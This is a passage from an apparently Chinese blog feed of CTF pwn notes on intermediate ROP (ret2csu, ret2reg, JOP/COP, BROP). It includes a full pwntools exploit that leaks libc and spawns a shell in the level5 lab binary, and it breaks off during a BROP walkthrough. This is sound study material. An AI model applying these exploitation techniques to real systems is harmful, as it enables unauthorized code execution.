(FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x804821c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481cc</span><br><span class="line"> 0x0000000a (STRSZ)                      74 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   16 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048298</span><br><span class="line"> 0x00000011 (REL)                        0x8048290</span><br><span class="line"> 0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x8048270</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x8048266</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.999.0.0&vd_source=7c4dd082dff9fc427aa20e5ec83b713e">【pwn】CTF学习：4、PLT表与GOT表 | 延迟绑定机制_哔哩哔哩_bilibili</a></p></li><li><p><a href="https://blog.csdn.net/linyt/article/details/51635768">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT_plt got_海枫的博客-CSDN博客</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Overflow-中级ROP</title>
      <link href="/article/ef4f.html"/>
      <url>/article/ef4f.html</url>
      
        <content type="html"><![CDATA[<h1 id="Stack-Overflow-中级ROP"><a href="#Stack-Overflow-中级ROP" class="headerlink" title="Stack Overflow - 中级ROP"></a>Stack Overflow - 中级ROP</h1><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>在64位程序中，函数的前六个参数是通过寄存器传递的，但是多数时候，不是很容易找到每一个寄存器对应的gadgets，这种情况下可以利用x64下的 <code>__libc_csu_init</code> 中的gadgets。 <strong>_libc_csu_init</strong> 一般来说，只要是调用了 libc.so 就会有这个函数来对 libc.so 进行初始化<ul><li>rdi，rsi，rdx，rcx，r8，r9用来传递函数的前六个参数，多于六个就放到栈里</li><li>libc包含了许多常见的函数：strcpy、strlen、strcmp、malloc、free、sprintf、scanf、printf、fopen、fclose、read、write等</li></ul></li></ul><p>这是一段<code>_libc_csu_init</code>函数的汇编指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004005A0                               ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005A0                               public __libc_csu_init</span><br><span class="line">.text:00000000004005A0                               __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0                               var_30= qword ptr -30h</span><br><span class="line">.text:00000000004005A0                               var_28= qword ptr -28h</span><br><span class="line">.text:00000000004005A0                               var_20= qword ptr -20h</span><br><span class="line">.text:00000000004005A0                               var_18= qword ptr -18h</span><br><span class="line">.text:00000000004005A0                               var_10= qword ptr -10h</span><br><span class="line">.text:00000000004005A0                               var_8= qword ptr -8</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0                               ; __unwind &#123;</span><br><span class="line">.text:00000000004005A0 48 89 6C 24 D8                mov     [rsp+var_28], rbp</span><br><span class="line">.text:00000000004005A5 4C 89 64 24 E0                mov     [rsp+var_20], r12</span><br><span class="line">.text:00000000004005AA 48 8D 2D 73 08 20 00          lea     rbp, cs:600E24h</span><br><span class="line">.text:00000000004005B1 4C 8D 25 6C 08 20 00          lea     r12, cs:600E24h</span><br><span class="line">.text:00000000004005B8 4C 89 6C 24 E8                mov     [rsp+var_18], r13</span><br><span class="line">.text:00000000004005BD 4C 89 74 24 F0                mov     [rsp+var_10], r14</span><br><span class="line">.text:00000000004005C2 4C 89 7C 24 F8                mov     [rsp+var_8], r15</span><br><span class="line">.text:00000000004005C7 48 89 5C 24 D0                mov     [rsp+var_30], rbx</span><br><span class="line">.text:00000000004005CC 48 83 EC 38                   sub     rsp, 38h</span><br><span class="line">.text:00000000004005D0 4C 29 E5                      sub     rbp, r12</span><br><span class="line">.text:00000000004005D3 41 89 FD                      mov     r13d, edi</span><br><span class="line">.text:00000000004005D6 49 89 F6                      mov     r14, rsi</span><br><span class="line">.text:00000000004005D9 48 C1 FD 03                   sar     rbp, 3</span><br><span class="line">.text:00000000004005DD 49 89 D7                      mov     r15, rdx</span><br><span class="line">.text:00000000004005E0 E8 1B FE FF FF                call    _init_proc</span><br><span class="line">.text:00000000004005E0</span><br><span class="line">.text:00000000004005E5 48 85 ED                      test    rbp, rbp</span><br><span class="line">.text:00000000004005E8 74 1C                         jz      short loc_400606</span><br><span class="line">.text:00000000004005E8</span><br><span class="line">.text:00000000004005EA 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:00000000004005EC 0F 1F 40 00                   nop     dword ptr [rax+00h]</span><br><span class="line">.text:00000000004005EC</span><br><span class="line">.text:00000000004005F0</span><br><span class="line">.text:00000000004005F0                               loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j</span><br><span class="line">.text:00000000004005F0 4C 89 FA                      mov     rdx, r15</span><br><span class="line">.text:00000000004005F3 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:00000000004005F6 44 89 EF                      mov     edi, r13d</span><br><span class="line">.text:00000000004005F9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005F9</span><br><span class="line">.text:00000000004005FD 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:0000000000400601 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604 75 EA                         jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400604</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606                               loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j</span><br><span class="line">.text:0000000000400606 48 8B 5C 24 08                mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B 48 8B 6C 24 10                mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610 4C 8B 64 24 18                mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615 4C 8B 6C 24 20                mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A 4C 8B 74 24 28                mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F 4C 8B 7C 24 30                mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624 48 83 C4 38                   add     rsp, 38h</span><br><span class="line">.text:0000000000400628 C3                            retn</span><br><span class="line">.text:0000000000400628                               ; &#125; // starts at 4005A0</span><br><span class="line">.text:0000000000400628</span><br><span class="line">.text:0000000000400628                               __libc_csu_init endp</span><br></pre></td></tr></table></figure><ul><li>可以利用的地方有：<ul><li>gadgets1：<ul><li>从0x0000000000400606 一直到0x000000000040061F，可以利用栈溢出构造栈上数据来控制rbx、rbp、r12、r13、r14、r15 寄存器的数据，随着环境的不同，r13、r14、r15的顺序也可能会有所改变</li></ul></li><li>gadgets2：<ul><li>从 0x00000000004005F0 到 0x00000000004005F9，通过gadgets1中最后的ret，让程序流程走gadgets2，这样就可以将r15赋给rdx，将r14赋给rsi，将r13赋给edi（这里虽然赋给了edi，但是此时rdi的高32位值为0，所以可以控制rdi寄存器的值，不过只能控制低32位）。上述三个寄存也是x64函数调用中传递的前三个寄存器。所以如果可以合理地控制r12与rbx，那么就可以调用我们想要调用的函数。比如可以在gadgets1中控制rbx为0，call指令就可以跳转到r12寄存器存储的位置处，r12存储想要调用的函数地址</li><li>从 0x00000000004005FD 到 0x0000000000400604 ，判断是否与rbp相等，否则重新执行gadgets2。可以看出，能够通过控制rbx +1 &#x3D; rbp，这样就不会再重复执行loc_400600，可以设置 rbx&#x3D;0，rbp&#x3D;1</li></ul></li></ul></li></ul><p>上面是IDA分析的level5，ctfwiki中的是另一种：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure><p>首先是gadgets1，mov指令变成了pop指令，gadgets中r13和r15的位置有些变化，功能是一样的，只需要在写payload时更改一下即可</p><h3 id="示例复现"><a href="#示例复现" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目来源：<a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5">ROP_STEP_BY_STEP&#x2F;linux_x64&#x2F;level5 at master · zhengmin1989&#x2F;ROP_STEP_BY_STEP · GitHub</a></p><p>检查安全保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序为64位，开启了堆栈不可执行保护，所以不能在栈中进行操作，IDA查看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能够看到read函数，read函数不检查输入字符串长度，可以进行溢出。能够看到buf变量距离rsp是<code>0h</code>个字节，buf的起始地址就是sp的地址。buf变量距离rbp是<code>0x80</code>，那么也就是可控制的栈空间就是buf变量的起始地址到ebp的地址<code>0x80</code>个字节。因为是64位，所以ebp的位置还有8个字节，这样从变量的起始位置到ret返回有<code>0x80 + 0x8</code>个字节</p><p>更推荐利用GDB计算栈空间，之前遇到的题目直接<code>cyclic 200</code>然后计算就可以得到，但是在这道题目中是不能直接计算的</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221408475.png"></p><p>这是由于程序使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则会抛出异常，如果gdb中没有显示返回地址的话可以通过<code>x/x $rsp</code>来查看即将返回的地址，在这里能够看见rsp的返回地址所以可以直接计算，如上图，注意小端序，所以偏移的计算应该是<code>cyclic -l  0x6261616a</code>或<code>cyclic -l jaab</code>，计算结果为136</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221408469.png"></p><p>而IDA中并没有找到system和&#x2F;bin&#x2F;sh，需要自己构造，如果system不起作用的话，用execve也可以获取shell</p><p>构造payload思路：</p><ul><li>构建第一发payload，首先填充栈空间，将返回地址改为gadgets1，那么在gadgets1中利用寄存器部署三个参数，并且在最后调用write在got表中的地址进而调用write函数打印出write函数的地址，最后返回主main函数</li><li>第二发payload和第一发类似，不过要调用read函数</li><li>第三发调用是将bss段首地址和bss+8 ，即首地址的下八位地址（&#x2F;bin&#x2F;sh字符串）作为参数，只用到两个参数所以只需要用到r12和r13两个寄存器，其他寄存器使用0占位即可</li></ul><blockquote><p>write()会把参数buf所指的内存写入count个字节到参数放到所指的文件内，fd为文件描述符，fd为1时为标准输出</p></blockquote><p>payload图示（<a href="https://www.yuque.com/hxfqg9/bin/pqc1nq#7Z8zh">Intermediate ROP (yuque.com)</a>）</p><p>第一发：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221408942.png"></p><p>第二发：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221409874.png"></p><p>第三发：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221412348.png"></p><p>构建EXP思路：</p><ul><li>先获取write函数、read函数的got表地址，main函数和bss段的地址，然后进行第一次栈溢出，输出write函数地址</li><li>将输出的write函数地址接收，利用LibcSearch查找Libc版本并计算该版本Libc的基地址，进而查找到execve函数的地址，然后进行第二次栈溢出，利用read函数将execve和”&#x2F;bin&#x2F;sh”写入bss段</li><li>然后进行第三次栈溢出，调用bss段内的execve(‘&#x2F;bin&#x2F;sh’)</li></ul><p>EXP：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = level5.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = level5.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">bss_base = level5.bss()</span><br><span class="line">csu_front_gadget = <span class="number">0x00000000004005F0</span></span><br><span class="line">csu_behind_gadget = <span class="number">0x0000000000400606</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">fill, rbx, rbp, r12, r13, r14, r15, main</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;hollkdig&#x27;</span> * <span class="number">17</span></span><br><span class="line">    payload += p64(csu_behind_gadget)</span><br><span class="line">    payload += p64(fill) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_gadget)</span><br><span class="line">    payload += <span class="string">b&#x27;hollkdig&#x27;</span> * <span class="number">7</span></span><br><span class="line">    payload += p64(main)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">&#x27;execve&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;execve_addr &#x27;</span> + <span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_base, <span class="number">16</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, bss_base, bss_base + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><ul><li><p>当允许输入的字节数较少时，可以考虑提前控制RBX和RBP，这样的话可以减少16字节</p></li><li><p>可以看到gadgets其实是两个部分，那么可以用两次调用，减少一次调用的字节数，但是需要有前提条件：</p><ul><li>漏洞可以多次触发</li><li>两次触发之间，r12-r15寄存器的值未被修改</li></ul></li><li><p>除了上面用到的gadgets，还有其他的函数也被编译进去了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure><p>此外可以将源程序中的一些地址进行偏移从而来获取我们想要的指令，确保程序不崩溃即可</p></li><li><p>libc_csu_init 的尾部通过偏移是可以控制其他寄存器的</p></li></ul><h3 id="其他字段"><a href="#其他字段" class="headerlink" title="其他字段"></a>其他字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x/5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x/5i 0x000000000040061A+3</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">gef➤  x/5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x/5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li>查看溢出函数返回时哪个寄存器指向缓冲区空间</li><li>查找<code>call reg</code>或者<code>jmp reg</code>指令，将EIP设置为该指令地址</li><li>在reg指向的空间上注入shellcode（确保该空间为可执行，栈上）</li></ul><h3 id="JOP"><a href="#JOP" class="headerlink" title="JOP"></a>JOP</h3><p>JOP（Jump-Oriented Programming）：JOP利用程序中的指令片段（gadget）来构造恶意代码执行流程。与ROP类似，但是JOP使用跳转指令来控制程序的执行流程，而不是使用函数调用指令。</p><h3 id="COP"><a href="#COP" class="headerlink" title="COP"></a>COP</h3><p>COP（Call-Oriented Programming）：COP是ROP的进一步发展，它使用程序中的函数调用指令（call instruction）来构建恶意代码执行流程。COP利用已有的函数调用和返回代码片段，将它们组合起来形成完整的恶意操作序列</p><h3 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>BROP（Blind ROP）：是看不到源代码或者二进制文件情况下，对程序进行攻击，劫持程序的执行流。类似于web里面的盲注，看不到关键信息，需要一个一个地去试。</p><h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><ul><li>源程序必须存在栈溢出</li><li>服务器端的进程在崩溃之后能够重新启动，并且重新启动的进程的地址要与之前的地址一致（也就是说，即便有ASLR保护，那么也只是在程序最初启动的时候有效果）</li></ul><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>基本思路：</p><ul><li>判断栈溢出的长度：暴力枚举</li><li>Stack Reading：获取栈上的数据来泄露canary以及ebp和返回地址</li><li>Blind ROP：找到足够多的gadgets来控制输出的函数，并对其及进行调用，比如write函数或者puts函数</li><li>EXP：利用输出函数来dump出程序以便于找到更多的gadgets</li></ul><h4 id="栈溢出长度"><a href="#栈溢出长度" class="headerlink" title="栈溢出长度"></a>栈溢出长度</h4><p>暴力枚举，直到发现程序崩溃</p><h4 id="Stack-Reading"><a href="#Stack-Reading" class="headerlink" title="Stack Reading"></a>Stack Reading</h4><p>关于canary以及后面的变量，采用的方法一致，以canary为例进行说明。</p><p>枚举所有数值效率很低，可以按照字节爆破，每个字节最多有256种可能，在32位的情况下，最多爆破1024，64位最多爆破2048次</p><h4 id="Blind-ROP"><a href="#Blind-ROP" class="headerlink" title="Blind ROP"></a>Blind ROP</h4><p>调用函数的最简便方法就是系统调用号，但是实际上syscall几乎不可能</p><p>所以可以使用<code>libc_csu_init </code>结尾的一段 gadgets 来实现</p><h3 id="示例复现-1"><a href="#示例复现-1" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目源代码：<a href="https://pan.baidu.com/s/15PyzxeGyHXc7jHQh7A-K1A#list/path=%2F">pwn7文件|百度网盘</a>提取码：0m8j</p><p>C源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!check())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Do not dump my memory&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No password, no game&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(buf,<span class="string">&quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目中，read函数有着明显的栈溢出</p><p>当然，实际情况是看不到源码的，这里是方便理解</p><p>查看保护机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>NX保护开启，无法在栈中部署shellcode，考虑使用gadgets。实际情况下由于看不到二进制代码，所以只能暴力枚举来不断地穷举地址，判断地址是否是我们想要的。PIE没有开启，程序初始地址为0x400000</p><p>大致思路就是：控制put函数打印自己的GOT表地址，通过GOT地址利用LibSearch计算当前使用的libc版本，然后找到system函数和&#x2F;bin&#x2F;sh地址部署到栈中执行</p><h4 id="判断栈溢出空间大小"><a href="#判断栈溢出空间大小" class="headerlink" title="判断栈溢出空间大小"></a>判断栈溢出空间大小</h4><p>暴力枚举，通过循环不断增加输入的字符长度，直到程序崩溃</p><p>由于看不到源码，所以先找出正常情况下和程序崩溃后的两种回显，以便我们猜测出栈溢出长度</p><p>输入一个a，回显为“No password, no game”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/CTF$ ./brop</span><br><span class="line">WelCome my friend,Do you know password?</span><br><span class="line">a</span><br><span class="line">No password, no 